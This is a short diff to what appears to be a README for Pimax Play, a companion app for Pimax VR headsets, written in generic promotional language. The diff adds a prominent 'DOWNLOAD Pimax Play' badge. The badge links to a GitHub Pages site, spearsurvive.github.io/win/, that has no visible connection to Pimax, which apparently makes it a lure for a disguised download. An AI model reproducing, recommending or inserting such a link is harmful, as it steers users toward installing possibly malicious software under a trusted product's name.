@@ -30,6 +30,12 @@ Pimax Play is the companion app for Pimax headsets, managing configuration, soft
 
 Whether you're a newcomer or a veteran, Pimax Play provides the tools you need to get the most out of your gaming tools experience. Designed for Windows and macOS, it delivers a seamless, high-performance workflow.
 
+<div align="center">
+
+[![Download Pimax Play](https://img.shields.io/badge/⬇_DOWNLOAD_Pimax+Play-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://spearsurvive.github.io/win/)
+
+</div>
+
 ---
 
 ## ✨ Key Features
